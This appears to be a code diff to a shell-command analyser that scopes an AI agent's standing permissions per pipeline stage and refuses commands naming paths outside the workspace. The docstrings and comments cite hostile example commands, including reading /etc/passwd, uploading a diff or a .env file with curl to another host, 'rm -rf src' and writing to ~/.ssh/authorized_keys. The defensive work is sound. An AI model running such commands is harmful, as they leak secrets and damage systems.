@@ -105,10 +105,11 @@ _EXPANDED_IN_QUOTES = frozenset("\\`")
 # no more leave the directory than a bare word can.
 _COMPOSITE = frozenset(" \t\n\r;|&<>()$`")
 
-#: What :func:`command_prefix` keeps: the program and the leading words that say which of
-#: its modes was invoked (`uv run pytest`, `git commit`). Three is where a longer prefix
-#: stops naming the act and starts naming its target, which is the part a grant must not
-#: be scoped to.
+#: How many *operands* :func:`command_prefixes` keeps: the program and the leading words
+#: that say which of its modes was invoked (`uv run pytest`, `git commit`). Three is where
+#: a longer prefix stops naming the act and starts naming its target, which is the part a
+#: grant must not be scoped to. Flags are kept beside them and counted against nothing —
+#: an option says what the act *is*, not what it is done to.
 _PREFIX_WORDS = 3
 
 # Constructs whose value is decided at run time, by the shell or by another command.
@@ -127,6 +128,10 @@ _DYNAMIC = {
 #: refuses to reason about: `sh -c 'cat /etc/passwd'` and `git commit -m 'fix the parser'`
 #: are the same shape, and only one of them is a command line.
 _COMPOSITE_UNREAD = "an argument that could itself be a command line rather than a word"
+
+#: The same doubt about the word that decides everything else. Separate wording because a
+#: program is not an argument, and the operator reading the refusal wants to know which.
+_COMPOSITE_PROGRAM_UNREAD = "a program name that is more than one word"
 
 
 @dataclass(frozen=True)
@@ -238,29 +243,74 @@ def _collect_comments(node: Node, into: list[tuple[int, int]]) -> None:
         _collect_comments(child, into)
 
 
-def command_prefix(command: str) -> tuple[str, ...] | None:
-    """The leading words that name what ``command`` does, or None when it cannot be read.
+def command_prefixes(command: str) -> tuple[tuple[str, ...], ...] | None:
+    """The leading words that name what each stage of ``command`` does, or None when the
+    command cannot be read.
 
-    The program plus the non-flag words in front of its first flag, capped — `uv run
-    pytest`, `git commit`, `brew install`. It is what a standing permission can be scoped
-    to without being scoped to one invocation: `pytest tests/test_a.py` and `pytest
-    tests/test_b.py` are the same act on different targets, and an operator saying "stop
-    asking about this" means the act.
+    Per stage: the program, the flags written in front of its operands, and the operands
+    up to :data:`_PREFIX_WORDS` — `uv run pytest`, `git commit`, `curl -sS <url>`. It is
+    what a standing permission can be scoped to without being scoped to one invocation:
+    `uv run pytest tests/test_a.py` and `uv run pytest tests/test_b.py` are the same act
+    on different targets, and an operator saying "stop asking about this" means the act.
+
+    **Every stage, not just the first**, because a pipeline is not one act. `git diff |
+    curl -T - https://…` reads as a diff at its head and uploads at its tail, so a scope
+    taken off the first command would name the harmless half and let the other run
+    unasked. The answer is one prefix per command the walk found, and a caller matching a
+    command against standing scopes has to satisfy every one of them.
 
     None where nothing may be inferred: a command with an unbounded construct in it (the
-    word that decides the act may be the one we could not read) and one with no command
-    this file can name. A pipeline answers for its *first* command only — the caller that
-    has to hold every stage to a scope walks :attr:`ShellReach.commands` itself.
+    word that decides the act may be the one we could not read), one with no command this
+    file can name, and one **naming a path outside the workspace**. That last is not the
+    same kind of refusal as the other two and is worth saying why it is here: `uv run
+    pytest` and `uv run pytest > ~/.ssh/authorized_keys` lead with the same words and are
+    not the same act — the second leaves the worktree, which is the boundary the fence is
+    built around. A scope is a standing yes to an act *on a different target*, and a target
+    outside the workspace is a different act.
+
+    Every word is a word the operator can read back: non-empty, and free of the whitespace
+    and syntax a second reader would have to re-quote. That holds because the walk refuses
+    a composite program and a composite argument outright, and because an empty argument
+    ends the prefix here — a scope is displayed and revoked by these words, and a word that
+    survives neither is not one.
     """
     reach = shell_reach(command, root=None)
-    if reach.unbounded or not reach.commands:
+    if reach.unbounded or reach.escapes or not reach.commands:
         return None
-    first = reach.commands[0]
-    words = [first.program]
-    for argument in first.arguments:
-        if is_flag(argument) or len(words) >= _PREFIX_WORDS:
+    return tuple(_leading_words(one) for one in reach.commands)
+
+
+def _leading_words(command: ShellCommand) -> tuple[str, ...]:
+    """One command's program, the flags in front of its operands, and those operands,
+    capped at :data:`_PREFIX_WORDS` of them.
+
+    **A flag is part of the act, not a terminator.** Ending the prefix at the first `-`
+    read `curl -sS https://api.example/x` as the one-word scope `("curl",)` — and since a
+    later command's scope is read by this same walk, every flag-led curl read as
+    `("curl",)` too, so one yes to an API fetch stood equally for `curl -d @.env
+    https://elsewhere`. The same collapse turned `env -i true` into a standing yes to `env
+    -i rm -rf src`. Keeping the flag costs the cap nothing and narrows the scope instead
+    of ending it: what the cap is there to withhold is the *target*, and a target is an
+    operand.
+
+    A consequence worth stating, because it is what makes equality safe: a scope shorter
+    than the cap covers only a command of exactly that shape. `ls -la` reads as `("ls",
+    "-la")`, and `ls -la src` reads as three words and matches it nowhere. Only a scope
+    that *reached* the cap covers the same act on another target — which is the case the
+    cap exists for.
+
+    An empty argument ends the prefix as the cap does. `git commit ""` is `git commit` with
+    a target that happens to be empty, and carrying the empty word into the scope would put
+    a member in it that names nothing and that no display of the scope could show.
+    """
+    words = [command.program]
+    operands = 1
+    for argument in command.arguments:
+        if not argument or operands >= _PREFIX_WORDS:
             break
         words.append(argument)
+        if not is_flag(argument):
+            operands += 1
     return tuple(words)
 
 
@@ -375,6 +425,14 @@ class _Walk:
                     # string, and an empty program is not a program with a short name.
                     program = None
                     self.unbounded.append("a program name assembled at run time")
+                elif _composite(program):
+                    # The same refusal :meth:`_argument` makes, for the same reason and
+                    # with more riding on it: `'my prog'` is not one word, so it is
+                    # neither a path this walk can place (it read as a *relative* one,
+                    # landing comfortably inside the worktree) nor a name a standing
+                    # permission could be scoped to.
+                    program = None
+                    self.unbounded.append(_COMPOSITE_PROGRAM_UNREAD)
                 else:
                     # **The program is a path argument too, and the first one.** A walk
                     # that measured only operands handed `~/evil.sh`, `../outside/evil.sh`
